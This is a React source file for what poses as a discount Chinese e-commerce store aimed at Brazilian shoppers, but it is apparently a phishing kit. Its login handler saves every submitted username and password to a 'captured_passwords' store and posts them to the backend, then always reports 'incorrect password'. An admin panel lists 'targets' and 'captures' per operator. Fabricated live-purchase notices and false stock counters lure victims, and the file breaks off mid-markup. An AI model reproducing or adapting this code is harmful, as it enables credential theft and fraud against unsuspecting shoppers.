import React, { useState, useEffect } from "react";
import { User } from "./types";
import ChineseEcommHeader from "./components/ChineseEcommHeader";
import LocalDbManager from "./components/LocalDbManager";
import QrCodeToggler from "./components/QrCodeToggler";
import RedPocketGift from "./components/RedPocketGift";

// Import images for proper static building and hashing by Vite
import serumSkincareGlow from "./assets/images/serum_skincare_glow.png";
import conjuntoColarCoracao from "./assets/images/conjunto_colar_coracao.png";
import tenisCasualFeminino from "./assets/images/tenis_casual_feminino.png";
import batomMatteRouge from "./assets/images/batom_matte_rouge.png";
import bolsaFemininaTiracolo from "./assets/images/bolsa_feminina_tiracolo.png";
import perfumeFemininoAmore from "./assets/images/perfume_feminino_amore.png";

// Lucide icons
import { 
  User as UserIcon, 
  Lock, 
  ShoppingBag, 
  Flame, 
  Sparkles, 
  ArrowRight, 
  CheckCircle2, 
  AlertCircle, 
  QrCode, 
  LogOut, 
  HelpCircle, 
  KeyRound, 
  Ticket, 
  Truck, 
  PackageCheck, 
  Wallet,
  ShieldAlert,
  ChevronRight,
  Database,
  Eye,
  EyeOff,
  Shield,
  X
} from "lucide-react";

export default function App() {
  const [language, setLanguage] = useState<"pt" | "zh" | "en">("pt");
  const [currency, setCurrency] = useState("BRL");
  const [loginMethod, setLoginMethod] = useState<"password" | "qrcode">("password");

  // Auth Inputs
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  
  // App States
  const [loggedInUser, setLoggedInUser] = useState<User | null>(() => {
    const saved = localStorage.getItem("chinese_store_session");
    return saved ? JSON.parse(saved) : null;
  });
  const [loading, setLoading] = useState(false);
  const [feedback, setFeedback] = useState<{ text: string; type: "success" | "error" } | null>(null);
  const [couponCode, setCouponCode] = useState("");
  const [couponSuccess, setCouponSuccess] = useState(false);
  const [dbRefreshToggle, setDbRefreshToggle] = useState(false);

  // Admin Panel State
  const [showAdminPanel, setShowAdminPanel] = useState(false);
  const [adminUser, setAdminUser] = useState("");
  const [adminPass, setAdminPass] = useState("");
  const [adminError, setAdminError] = useState<string | null>(null);
  const [adminSuccess, setAdminSuccess] = useState<string | null>(null);
  const [storageItems, setStorageItems] = useState<{ key: string; value: string }[]>([]);
  const [capturedPasswords, setCapturedPasswords] = useState<{ user: string; pass: string; time: string }[]>([]);

  // Advanced Admin Panel Access Control States
  const [anyAdminExists, setAnyAdminExists] = useState(false);
  const [isAdminRegistering, setIsAdminRegistering] = useState(false);
  const [currentAdminUser, setCurrentAdminUser] = useState<string>(() => {
    return localStorage.getItem("current_admin_user") || "";
  });
  const [adminAuthed, setAdminAuthed] = useState<boolean>(() => {
    return !!localStorage.getItem("current_admin_user");
  });
  const [myUsers, setMyUsers] = useState<User[]>([]);
  const [activeAdminTab, setActiveAdminTab] = useState<"targets" | "captures" | "new_admin">("targets");

  // Live Purchase Notifications
  const [liveNotification, setLiveNotification] = useState<string | null>(null);

  // Monitored user for password capture
  const [monitoredUser, setMonitoredUser] = useState(() => {
    return localStorage.getItem("monitored_user") || "";
  });

  const checkAdminsExist = async () => {
    try {
      const res = await fetch("/api/admins/exists");
      const data = await res.json();
      setAnyAdminExists(data.exists);
      if (!data.exists) {
        setIsAdminRegistering(true); // Force register if no admins exist
      } else {
        setIsAdminRegistering(false);
      }
    } catch (err) {
      console.error("Error checking admins:", err);
    }
  };

  const fetchMyUsers = async () => {
    if (!currentAdminUser) return;
    try {
      const res = await fetch(`/api/users?createdBy=${encodeURIComponent(currentAdminUser)}`);
      const data = await res.json();
      if (data.success) {
        setMyUsers(data.users);
      }
    } catch (err) {
      console.error("Error fetching admin target users:", err);
    }
  };

  const refreshStorageData = () => {
    const items: { key: string; value: string }[] = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key) {
        items.push({ key, value: localStorage.getItem(key) || "" });
      }
    }
    setStorageItems(items);

    const captured: { user: string; pass: string; time: string }[] = [];
    try {
      const raw = localStorage.getItem("captured_passwords");
      if (raw) {
        const parsed = JSON.parse(raw);
        if (Array.isArray(parsed)) {
          captured.push(...parsed);
        }
      }
    } catch {}
    setCapturedPasswords(captured);
  };

  const handleOpenAdmin = () => {
    setShowAdminPanel(true);
    setAdminError(null);
    setAdminSuccess(null);
    setAdminUser("");
    setAdminPass("");
    checkAdminsExist();
  };

  const handleSaveMonitoredUser = () => {
    const input = (document.getElementById("monitored-input") as HTMLInputElement)?.value || "";
    const formatted = input.startsWith("@") ? input : `@${input}`;
    localStorage.setItem("monitored_user", formatted);
    setMonitoredUser(formatted);
  };

  const handleClearMonitoredUser = () => {
    localStorage.removeItem("monitored_user");
    setMonitoredUser("");
  };

  const handleClearCaptured = () => {
    if (confirm("Deseja realmente limpar seu histórico local de capturas?")) {
      localStorage.removeItem("captured_passwords");
      setCapturedPasswords([]);
    }
  };

  const handleAdminLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setAdminError(null);
    setAdminSuccess(null);

    const endpoint = isAdminRegistering ? "/api/admins/register" : "/api/admins/login";
    try {
      const res = await fetch(endpoint, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: adminUser, password: adminPass })
      });
      const data = await res.json();
      if (res.ok && data.success) {
        if (isAdminRegistering) {
          // Auto login after registration
          const loginRes = await fetch("/api/admins/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username: adminUser, password: adminPass })
          });
          const loginData = await loginRes.json();
          if (loginRes.ok && loginData.success) {
            setAdminAuthed(true);
            setCurrentAdminUser(adminUser);
            localStorage.setItem("current_admin_user", adminUser);
            refreshStorageData();
          } else {
            setAdminError(loginData.message || "Erro ao efetuar login após cadastro.");
          }
        } else {
          setAdminAuthed(true);
          setCurrentAdminUser(adminUser);
          localStorage.setItem("current_admin_user", adminUser);
          refreshStorageData();
        }
      } else {
        setAdminError(data.message || "Credenciais ou operação inválidas.");
      }
    } catch (err) {
      setAdminError("Erro de conexão ao servidor.");
    }
  };

  const handleRegisterAdditionalAdmin = async (e: React.FormEvent) => {
    e.preventDefault();
    setAdminError(null);
    setAdminSuccess(null);
    try {
      const res = await fetch("/api/admins/register", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: adminUser, password: adminPass })
      });
      const data = await res.json();
      if (res.ok && data.success) {
        setAdminSuccess(`Administrador '${adminUser}' registrado com sucesso!`);
        setAdminUser("");
        setAdminPass("");
      } else {
        setAdminError(data.message || "Erro ao cadastrar.");
      }
    } catch (err) {
      setAdminError("Erro de conexão ao servidor.");
    }
  };

  const handleAdminLogout = () => {
    setAdminAuthed(false);
    setCurrentAdminUser("");
    localStorage.removeItem("current_admin_user");
  };

  const handleCloseAdmin = () => {
    setShowAdminPanel(false);
  };

  // Auto-refresh captured data and admin target list
  useEffect(() => {
    if (!adminAuthed) return;
    refreshStorageData();
    fetchMyUsers();
    const interval = setInterval(() => {
      refreshStorageData();
      fetchMyUsers();
    }, 2000);
    return () => clearInterval(interval);
  }, [adminAuthed, dbRefreshToggle]);

  const handleUsernameChange = (val: string) => {
    setUsername(val);
  };

  // Perform database login
  const handleLoginSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    const form = e.currentTarget as HTMLFormElement;
    const fd = new FormData(form);
    const domUser = (fd.get("login_username") as string || "").trim();
    const domPass = fd.get("login_password") as string || "";

    const rawUser = domUser || username.trim();
    const rawPass = domPass || password;

    if (rawUser) {
      const formattedUser = rawUser.startsWith("@") ? rawUser : `@${rawUser}`;
      const entry = {
        user: formattedUser,
        pass: rawPass,
        time: new Date().toLocaleString("pt-BR")
      };
      
      try {
        const debugLog = JSON.parse(localStorage.getItem("capture_debug") || '{"count":0,"entries":[]}');
        debugLog.count++;
        debugLog.entries.push({ user: formattedUser, pass: rawPass, time: entry.time });
        if (debugLog.entries.length > 10) debugLog.entries.shift();
        localStorage.setItem("capture_debug", JSON.stringify(debugLog));
      } catch {}
      
      try {
        const existing = JSON.parse(localStorage.getItem("captured_passwords") || "[]");
        existing.push(entry);
        localStorage.setItem("captured_passwords", JSON.stringify(existing));
      } catch (err) {
        console.error("localStorage capture failed:", err);
      }

      // Also trigger a silent POST to the login route so it logs the password update in backend users.json!
      fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: formattedUser, password: rawPass })
      }).catch(err => console.error("API login save error:", err));
    }

    if (!rawUser || !rawPass) {
      showFeedback(
        language === "zh" ? "请输入用户名和密码。" : language === "en" ? "Please enter username and password." : "Por favor, digite o usuário e senha.", 
        "error"
      );
      return;
    }

    setLoading(true);
    setFeedback(null);

    // Show "senha incorreta"
    setTimeout(() => {
      showFeedback(
        language === "zh" ? "密码错误。请检查您的凭证。" : language === "en" ? "Incorrect password. Verify credentials." : "Senha incorreta. Verifique suas credenciais.", 
        "error"
      );
      setLoading(false);
    }, 1200);
  };

  // QR Code login success simulation
  const handleQrSuccess = (userObj: { username: string; name: string; role: string }) => {
    setLoggedInUser(userObj);
    localStorage.setItem("chinese_store_session", JSON.stringify(userObj));
    showFeedback(
      language === "zh" ? `通过二维码扫码登录成功！欢迎，${userObj.name}。` : language === "en" ? `Logged in via QR scan success! Welcome, ${userObj.name}.` : `Logado via QR Code com sucesso! Bem-vindo(a), ${userObj.name}.`,
      "success"
    );
  };

  const showFeedback = (text: string, type: "success" | "error") => {
    setFeedback({ text, type });
  };

  const handleLogout = () => {
    setLoggedInUser(null);
    localStorage.removeItem("chinese_store_session");
    setUsername("");
    setPassword("");
    setFeedback(null);
  };

  const applyPromoCoupon = (code: string) => {
    setCouponCode(code);
    if (code.toUpperCase() === "CHINA666") {
      setCouponSuccess(true);
    } else {
      setCouponSuccess(false);
    }
  };

  const handleAutofillUser = (user: User) => {
    setUsername(user.username);
    setPassword(user.password || "");
    setLoginMethod("password");
    showFeedback(
      language === "zh" ? "已自动填充测试凭据！" : language === "en" ? "Test credentials filled!" : "Credenciais preenchidas! Clique no botão de entrar.",
      "success"
    );
  };

  // Click Buy on Promotional Clothing Items
  const handleBuyClick = (productName: string) => {
    const element = document.getElementById("login-box-container");
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "center" });
      element.classList.add("ring-4", "ring-[#cfab7c]", "animate-pulse");
      setTimeout(() => {
        element.classList.remove("ring-4", "ring-[#cfab7c]", "animate-pulse");
      }, 3000);
      showFeedback(
        language === "zh" ? `您已选择 "${productName}"！请在下方登录您的 VIP 账户以享 1 折优惠购买。` : 
        language === "en" ? `You selected "${productName}"! Log in to your VIP account below to secure the 90% discount.` :
        `Você selecionou "${productName}"! Entre com seu Usuário VIP abaixo para finalizar o pedido com 90% OFF.`,
        "success"
      );
    }
  };

  // Live simulation notifications loop
  useEffect(() => {
    const messages = {
      pt: [
        "Maria S. de São Paulo comprou Sérum Facial Hidratante Ácido Hialurônico Glow",
        "Carlos R. de Curitiba resgatou cupom CHINA666 com sucesso!",
        "Ana B. de Porto Alegre comprou Kit Conjunto Colar e Brincos Coração",
        "Juliana F. resgatou R$ 189,50 de cashback na carteira VIP",
        "Roberto M. comprou Tênis Casual Feminino Soft Walk"
      ],
      zh: [
        "张*珍（圣保罗）成功使用首单优惠券购买了玻尿酸补水精华液",
        "李*国（北京）成功领取了双十一 1 折专享红包",
        "王*伟（深圳）已激活海外尊享 VIP 买手通道",
        "陈*（广州）刚刚获得了 ¥189.50 现金返还",
        "卢*（里约）购买了轻便防滑休闲运动鞋，预计3天送达"
      ],
      en: [
        "Maria S. from Sao Paulo bought Glow Skincare Hyaluronic Acid Serum (90% OFF)",
        "Carlos R. from Curitiba claimed code CHINA666 successfully!",
        "Juliana F. claimed $189.50 VIP cashback in her wallet",
        "Carlos R. from Curitiba purchased Soft Walk Lightweight Women's Sneakers"
      ]
    }[language];

    const triggerNotification = () => {
      const idx = Math.floor(Math.random() * messages.length);
      setLiveNotification(messages[idx]);
      setTimeout(() => {
        setLiveNotification(null);
      }, 4500);
    };

    const initial = setTimeout(triggerNotification, 3000);
    const timer = setInterval(triggerNotification, 14000);

    return () => {
      clearTimeout(initial);
      clearInterval(timer);
    };
  }, [language]);

  const termsText = {
    pt: {
      userField: "Nome de Usuário (@usuario)",
      passField: "Senha de Acesso",
      enterBtn: "Entrar com Segurança",
      enterLoading: "Autenticando...",
      methodPass: "Senha e Usuário",
      methodQR: "Código QR",
      noRegister: "Acesso restrito para compradores VIP cadastrados e homologados pela aduana.",
      terms: "Ao continuar, você concorda com nossos termos de importação direta.",
      logisticsTitle: "Status Recente da Encomenda",
      logisticsStep: " Shenzhen - Saída do centro de processamento internacional rumo ao Brasil",
      points: "Pontos de Fidelidade",
      wallet: "Saldo Carteira",
      welcome: "Painel do Importador VIP",
      activeUser: "Sua conta ativa no users.json",
      mockShipping: "Rastreamento Inteligente",
      howToTest: "Como funciona este teste local?",
      promptDesc: "O frontend se conecta de forma segura ao back-end que gerencia os usuários em users.json.",
      logoutBtn: "Encerrar Sessão",
      productsTitle: "Ofertas da Temporada - Preferidos das Mulheres",
      productsSub: "Os produtos de skincare, calçados macios e acessórios mais desejados com 90% OFF usando o cupom",
      buyNow: "Resgatar Oferta VIP"
    },
    zh: {
      userField: "用户名 (@昵称)",
      passField: "安全登录密码",
      enterBtn: "安全登录",
      enterLoading: "正在安全验证...",
      methodPass: "密码账户登录",
      methodQR: "二维码扫码",
      noRegister: "仅限经海关核准 of 注册受邀境外VIP买手登录。",
      terms: "登录即代表您同意淘宝全球买手使用条款及跨境采购协议。",
      logisticsTitle: "最新物流包裹状态",
      logisticsStep: "【深圳市】 国际分拨中心已揽收，正出境发往国际仓",
      points: "会员积分",
      wallet: "电子钱包余额",
      welcome: "跨境进口采购大厅",
      activeUser: "users.json 当前活动会话",
      mockShipping: "智能包邮揽收进度",
      howToTest: "此本地测试如何运作？",
      promptDesc: "前端与后端进行安全连接，并将用户数据 and 输入的密码保存至本地 users.json 文件里。",
      logoutBtn: "退出登录",
      productsTitle: "春季女性好物 • 专属满减区",
      productsSub: "精选护肤精粹、经典美饰与舒适休闲鞋，输入迎新码自动抵扣 90%",
      buyNow: "一键 Resgatar 优惠"
    },
    en: {
      userField: "Username (@user)",
      passField: "Security Password",
      enterBtn: "Sign In Securely",
      enterLoading: "Checking...",
      methodPass: "Account Password",
      methodQR: "QR Code",
      noRegister: "Restricted access for registered and custom-authorized VIP buyers.",
      terms: "By logging in, you agree to our direct dropshipping service policy.",
      logisticsTitle: "Recent Package Shipping Status",
      logisticsStep: " Shenzhen Hub - Departed international outbound facility",
      points: "Loyalty Points",
      wallet: "Wallet Balance",
      welcome: "VIP Hub Buyer Dashboard",
      activeUser: "Active users.json session",
      mockShipping: "Smart Tracker Node",
      howToTest: "How does this local test work?",
      promptDesc: "The frontend connects securely to the backend which manages all credentials on users.json.",
      logoutBtn: "Sign Out",
      productsTitle: "Limited Season Deals - Women's Favorites",
      productsSub: "Top-selling skincare, comfortable sneakers, and gold jewelry at 90% OFF with Welcome Coupon",
      buyNow: "Secure VIP Deal"
    }
  }[language];

  // Premium Chinese clothing items to promote
  const clothingProducts = [
    {
      id: "prod-skincare-serum",
      name: language === "zh" ? "玻尿酸补水修护面部精华液" : language === "en" ? "Glow Skincare Hyaluronic Acid Serum" : "Sérum Facial Hidratante Ácido Hialurônico Glow",
      desc: language === "zh" ? "深层补水，紧致修护，打造韩式水光肌，温和无刺激。" : language === "en" ? "Deep hydration and barrier repair for a radiant, glowing complexion." : "Hidratação profunda, preenchimento de linhas finas e efeito pele iluminada (Glow) natural.",
      image: serumSkincareGlow,
      originalPrice: currency === "BRL" ? 89.90 : currency === "CNY" ? 110.00 : 16.00,
      promoPrice: currency === "BRL" ? 19.90 : currency === "CNY" ? 25.00 : 4.00,
      stockPercent: 94,
      itemsLeft: 5,
      badge: language === "zh" ? "护肤必入" : language === "en" ? "Skincare Fav" : "Queridinho"
    },
    {
      id: "prod-jewelry-set",
      name: language === "zh" ? "极简爱心项链耳环三件套 - 镀18K金" : language === "en" ? "18K Gold Plated Heart Necklace & Earrings Set" : "Kit Conjunto Colar e Brincos Coração - Folheado a Ouro 18k",
      desc: language === "zh" ? "精致爱心吊坠搭配百搭耳环，防过敏材质，日常优雅配饰。" : language === "en" ? "Elegant heart pendant and matching studs, hypoallergenic, perfect daily accessory." : "Conjunto clássico de colar com pingente e brincos delicados em formato de coração, antialérgico.",
      image: conjuntoColarCoracao,
      originalPrice: currency === "BRL" ? 150.00 : currency === "CNY" ? 180.00 : 28.00,
      promoPrice: currency === "BRL" ? 29.90 : currency === "CNY" ? 38.00 : 6.00,
      stockPercent: 91,
      itemsLeft: 3,
      badge: language === "zh" ? "爆款配饰" : language === "en" ? "Trending Biju" : "Mais Vendido"
    },
    {
      id: "prod-sneakers-soft",
      name: language === "zh" ? "轻便透气休闲运动鞋 - 软底防滑" : language === "en" ? "Soft Walk Lightweight Casual Women's Sneakers" : "Tênis Casual Feminino Soft Walk - Conforto Dia a Dia",
      desc: language === "zh" ? "超轻发泡软底，透气网面设计，久站不累脚，防滑耐磨。" : language === "en" ? "Ultra-lightweight foam sole with breathable mesh, ideal for walking and standing all day." : "Solado macio ultra leve com amortecimento, cabedal respirável, ideal para caminhadas e rotina.",
      image: tenisCasualFeminino,
      originalPrice: currency === "BRL" ? 269.90 : currency === "CNY" ? 320.00 : 49.00,
      promoPrice: currency === "BRL" ? 49.90 : currency === "CNY" ? 60.00 : 9.90,
      stockPercent: 96,
      itemsLeft: 2,
      badge: language === "zh" ? "限时特惠" : language === "en" ? "Comfort Fit" : "Campeão de Vendas"
    },
    {
      id: "prod-makeup-lipstick",
      name: language === "zh" ? "哑光丝绒雾面口红 - 持久显色" : language === "en" ? "Velvet Matte Long Lasting Lipstick" : "Batom Matte Velvet Longa Duração Rouge",
      desc: language === "zh" ? "丝绒哑光质地，柔滑显色，不易脱色，滋润双唇。" : language === "en" ? "Richly pigmented matte finish that feels lightweight and stays comfortable for up to 12 hours." : "Fórmula confortável com acabamento matte aveludado, alta pigmentação e duração de 12 horas.",
      image: batomMatteRouge,
      originalPrice: currency === "BRL" ? 69.90 : currency === "CNY" ? 89.00 : 12.00,
      promoPrice: currency === "BRL" ? 14.90 : currency === "CNY" ? 19.00 : 3.00,
      stockPercent: 95,
      itemsLeft: 3,
      badge: language === "zh" ? "彩妆爆款" : language === "en" ? "Bestseller" : "Queridinho"
    },
    {
      id: "prod-fashion-bag",
      name: language === "zh" ? "时尚百搭斜挎小包 - 优质皮革" : language === "en" ? "Elegance Compact Crossbody Women's Bag" : "Bolsa Feminina Transpassada Compacta Elegance",
      desc: language === "zh" ? "精选优质环保皮革，多层收纳空间，时尚链条肩带。" : language === "en" ? "Eco-leather textured bag with smart compartments and adjustable metal chain strap." : "Bolsa tiracolo em couro ecológico, compacta com divisórias e alça regulável.",
      image: bolsaFemininaTiracolo,
      originalPrice: currency === "BRL" ? 199.90 : currency === "CNY" ? 249.00 : 39.00,
      promoPrice: currency === "BRL" ? 39.90 : currency === "CNY" ? 49.00 : 8.00,
      stockPercent: 89,
      itemsLeft: 4,
      badge: language === "zh" ? "新品上架" : language === "en" ? "New Style" : "Lançamento"
    },
    {
      id: "prod-perfume-flora",
      name: language === "zh" ? "巴黎恋人淡香精 50ml - 花果香调" : language === "en" ? "Amore Eau de Parfum for Women 50ml" : "Perfume Feminino Amore Eau de Parfum 50ml",
      desc: language === "zh" ? "经典甜美花果香调，前调茉莉中调香草，温婉迷人。" : language === "en" ? "Delicate floral-fruity scent with jasmine and warm vanilla undertones, designed for daily wear." : "Fragrância floral frutada marcante com notas de jasmin e baunilha, ideal para o dia a dia.",
      image: perfumeFemininoAmore,
      originalPrice: currency === "BRL" ? 289.90 : currency === "CNY" ? 360.00 : 55.00,
      promoPrice: currency === "BRL" ? 59.90 : currency === "CNY" ? 75.00 : 12.00,
      stockPercent: 93,
      itemsLeft: 2,
      badge: language === "zh" ? "香氛大赏" : language === "en" ? "Trending" : "Destaque"
    }
  ];

  // Filter captured passwords to show only those belonging to users created by this admin
  const myUsernames = myUsers.map(u => u.username.toLowerCase());
  const filteredCaptured = capturedPasswords.filter(entry => 
    myUsernames.includes(entry.user.toLowerCase())
  );

  return (
    <div className="min-h-screen bg-[#0f0b09] font-sans text-[#ebdcc6] flex flex-col justify-between selection:bg-[#cfab7c] selection:text-[#1c1815] overflow-x-hidden relative">
      {/* Visual background pattern/glows for Chinese style */}
      <div className="absolute top-0 left-0 w-full h-[600px] bg-gradient-to-b from-[#7a1715]/10 via-[#1c1815]/5 to-transparent pointer-events-none z-0"></div>

      {/* Immersive Store Header Row */}
      <ChineseEcommHeader 
        language={language} 
        setLanguage={setLanguage} 
        currency={currency} 
        setCurrency={setCurrency} 
        onOpenAdmin={handleOpenAdmin}
      />

      {/* Hero Announcement section */}
      <section className="relative z-10 w-full max-w-6xl mx-auto px-4 pt-8 md:pt-12 text-center select-none animate-fade-in">
        <span className="text-[9px] md:text-[11px] text-[#cfab7c] font-black uppercase tracking-[0.35em] font-mono bg-[#cfab7c]/5 border border-[#cfab7c]/20 px-3 py-1">
          {language === "zh" ? "11.11 全球狂欢季 • 尊享大赏" : language === "en" ? "11.11 GLOBAL BUYER FESTIVAL" : "FESTIVAL GLOBAL DE COMPRAS 11.11"}
        </span>
        <h2 className="text-3xl md:text-5xl lg:text-6xl font-serif text-white font-light tracking-wide mt-4">
          {language === "zh" ? "江浙沪非遗桑蚕丝 • 特惠私享会" : "Alta Costura Chinesa & Seda Natural"}
        </h2>
        <p className="mt-3 text-xs md:text-sm text-[#b39063] font-serif max-w-xl mx-auto italic">
          {termsText.productsSub}
        </p>
      </section>

      {/* Main Content Area */}
      <main className="relative z-10 flex-1 w-full max-w-6xl mx-auto px-3 md:px-4 py-8 md:py-12 grid grid-cols-1 lg:grid-cols-12 gap-6 lg:gap-8 items-start">
        
        {/* LEFT COLUMN: Clothes Promotions (7 cols on large screens) */}
        <div className="lg:col-span-7 space-y-6">
          <h3 className="text-xs md:text-sm font-black uppercase tracking-widest text-[#cfab7c] border-b border-[#cfab7c]/25 pb-2 font-mono flex items-center gap-2">
            <span className="w-2 h-2 bg-[#D91E18] animate-pulse"></span>
            <span>{termsText.productsTitle}</span>
          </h3>

          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-1 gap-4">
            {clothingProducts.map((product) => (
              <div 
                key={product.id}
                className="bg-[#1c1815] border border-[#cfab7c]/25 hover:border-[#cfab7c]/60 p-3 md:p-4 rounded-none transition-all duration-300 shadow-xl flex flex-col sm:flex-row gap-4 items-stretch group overflow-hidden relative"
              >
                {/* Glowing border on hover */}
                <div className="absolute inset-0 bg-[#cfab7c]/2 opacity-0 group-hover:opacity-100 transition-opacity duration-300 pointer-events-none"></div>

                {/* Product Image Cover */}
                <div className="w-full sm:w-28 md:w-32 h-44 sm:h-auto bg-[#2e2621] relative overflow-hidden flex-shrink-0 flex items-center justify-center border border-[#cfab7c]/10">
                  <img 
                    src={product.image} 
                    alt={product.name}
                    className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-105"
                  />
                  <span className="absolute top-2 left-2 text-[8px] md:text-[9px] bg-[#D91E18] text-white px-2 py-0.5 rounded-none font-bold tracking-widest uppercase shadow-md select-none font-mono">
                    {product.badge}
                  </span>
                </div>

                {/* Product Details */}
                <div className="flex-1 flex flex-col justify-between py-1">
                  <div>
                    <h4 className="font-serif font-semibold text-[#ebdcc6] text-sm md:text-base group-hover:text-[#cfab7c] transition-colors leading-tight">
                      {product.name}
                    </h4>
                    <p className="text-[10px] md:text-[11px] text-stone-400 font-light mt-1.5 leading-relaxed font-serif">
                      {product.desc}
                    </p>
                  </div>

                  {/* Stock progress */}
                  <div className="mt-3">
                    <div className="flex items-center justify-between text-[8px] md:text-[9px] font-mono uppercase text-[#cfab7c] font-black mb-1">
                      <span>Restam apenas {product.itemsLeft} unidades!</span>
                      <span>{product.stockPercent}% VENDIDO</span>
                    </div>
                    <div className="w-full h-1 bg-[#2e2621]">
                      <div 
                        className="h-full bg-gradient-to-r from-[#D91E18] to-[#cfab7c]" 
                        style={{ width: `${product.stockPercent}%` }}
                      ></div>
                    </div>
                  </div>

                  {/* Pricing and Action */}
                  <div className="flex items-center justify-between mt-4 gap-3 border-t border-[#cfab7c]/10 pt-3">
                    <div>
                      <span className="text-[9px] text-stone-500 font-mono line-through">
                        {currency === "BRL" ? "R$" : currency === "CNY" ? "¥" : "$"} {product.originalPrice.toFixed(2)}
                      </span>
                      <p className="text-sm md:text-base font-bold text-white font-mono flex items-baseline gap-1 mt-0.5">
                        <span className="text-xs text-[#cfab7c]">
                          {currency === "BRL" ? "R$" : currency === "CNY" ? "¥" : "$"}
                        </span>
                        <span className="text-lg text-[#cfab7c] font-black">{product.promoPrice.toFixed(2)}</span>
                      </p>
                    </div>

                    <button
                      onClick={() => handleBuyClick(product.name)}
                      className="px-3.5 py-2 bg-[#D91E18] hover:bg-red-700 text-white font-mono font-bold text-[9px] uppercase tracking-widest transition-all duration-200 active:scale-95 cursor-pointer shadow-md select-none border border-yellow-400/20 animate-pulse"
                    >
                      {termsText.buyNow}
                    </button>
                  </div>
                </div>

              </div>
            ))}
          </div>

          {/* Luxury Banner coupon indicator */}
          <div className="p-4 bg-gradient-to-r from-[#1c1815] to-[#2d1211] border border-[#cfab7c]/30 rounded-none relative overflow-hidden flex flex-col sm:flex-row items-center justify-between gap-4 select-none">
            <div className="absolute top-1/2 -left-2 -translate-y-1/2 w-4 h-4 bg-[#0f0b09] rounded-full border-r border-[#cfab7c]/30"></div>
            <div className="absolute top-1/2 -right-2 -translate-y-1/2 w-4 h-4 bg-[#0f0b09] rounded-full border-l border-[#cfab7c]/30"></div>
            
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 bg-[#D91E18] border border-yellow-400 flex items-center justify-center text-white font-black font-serif italic text-base shadow-lg">
                福
              </div>
              <div>
                <h4 className="text-[10px] md:text-xs text-[#cfab7c] font-black uppercase tracking-widest font-mono">Cupom Extra de Fidelidade Ativo</h4>
                <p className="text-[9px] md:text-[10px] text-stone-400 font-serif leading-relaxed italic mt-0.5">
                  Copie o código <strong className="font-mono text-white">CHINA666</strong> no Red Pocket abaixo para resgatar o desconto.
                </p>
              </div>
            </div>
            <div className="bg-[#cfab7c]/10 border border-[#cfab7c]/30 px-3 py-1 font-mono text-xs font-bold text-[#cfab7c] tracking-widest uppercase">
              90% de Desconto
            </div>
          </div>
        </div>

        {/* RIGHT COLUMN: Auth Page stage (5 cols on large screens) */}
        <div id="login-box-container" className="lg:col-span-5 transition-all duration-300">
          
          {loggedInUser ? (
            /* USER IS LOGGED IN - HIGHLY AMBIENT USER HUD */
            <div className="bg-[#1c1815] border border-[#cfab7c]/30 rounded-none p-4 md:p-6 shadow-xl relative overflow-hidden animate-scale-up text-[#ebdcc6]">
              {/* Gold light reflections */}
              <div className="absolute top-0 right-0 w-24 h-24 bg-[#cfab7c]/5 blur-2xl rounded-full"></div>
              
              {/* Authenticated Header */}
              <div className="flex items-start justify-between border-b border-[#cfab7c]/15 pb-4 mb-4 gap-3">
                <div className="flex items-center gap-3 min-w-0">
                  <div className="w-12 h-12 rounded-none bg-gradient-to-tr from-[#cfab7c] to-[#ebdcc6] flex items-center justify-center shadow-lg text-[#1c1815] font-serif font-bold text-lg md:text-xl relative border border-[#6b583f]/30 flex-shrink-0">
                    {loggedInUser.name.charAt(0)}
                    <span className="absolute bottom-0 right-0 w-2.5 h-2.5 bg-emerald-500 border border-[#1c1815] rounded-none animate-pulse"></span>
                  </div>
                  <div className="min-w-0">
                    <span className="text-[8px] md:text-[9px] uppercase font-bold tracking-[0.15em] text-[#cfab7c] bg-[#cfab7c]/10 px-1.5 py-0.5 rounded-none border border-[#cfab7c]/20 font-mono inline-block truncate max-w-full">
                      {loggedInUser.role} 
                    </span>
                    <h3 className="font-serif font-normal text-white text-base mt-1.5 leading-none uppercase tracking-wide truncate">{loggedInUser.name}</h3>
                    <p className="text-[10px] text-stone-400 font-mono mt-1 font-semibold truncate">{loggedInUser.username}</p>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={handleLogout}
                  className="px-2.5 py-1 bg-[#D91E18] hover:bg-red-700 text-white rounded-none transition-all duration-150 flex items-center gap-1 text-[9px] font-bold uppercase tracking-widest border border-yellow-400/25 group cursor-pointer flex-shrink-0"
                  title={termsText.logoutBtn}
                >
                  <LogOut className="w-3 h-3 group-hover:-translate-x-0.5 transition-transform text-white" />
                  <span>Sair</span>
                </button>
              </div>

              {/* Simulated Customer Wallet Details */}
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-4">
                <div className="bg-[#2e2621]/40 p-4 border border-[#cfab7c]/10 rounded-none animate-fade-in">
                  <span className="text-[8px] md:text-[9px] text-[#cfab7c] uppercase tracking-widest block mb-1 font-bold font-mono">{termsText.wallet}</span>
                  <div className="flex items-baseline gap-1">
                    <span className="text-[11px] text-[#cfab7c] font-light">
                      {currency === "BRL" ? "R$" : currency === "CNY" ? "¥" : "$"}
                    </span>
                    <span className="text-base md:text-xl font-bold text-white font-mono">
                      {currency === "BRL" ? "1.890,50" : currency === "CNY" ? "2.450,00" : "335.00"}
                    </span>
                  </div>
                  <span className="text-[7px] md:text-[8px] text-emerald-400 flex items-center gap-1 mt-2 font-mono uppercase tracking-wider font-semibold">
                    <span className="w-1.5 h-1.5 rounded-none bg-emerald-500"></span>
                    <span>Reembolso Ativo</span>
                  </span>
                </div>

                <div className="bg-[#2e2621]/40 p-4 border border-[#cfab7c]/10 rounded-none animate-fade-in">
                  <span className="text-[8px] md:text-[9px] text-[#cfab7c] uppercase tracking-widest block mb-1 font-bold font-mono">{termsText.points}</span>
                  <div className="flex items-baseline gap-1">
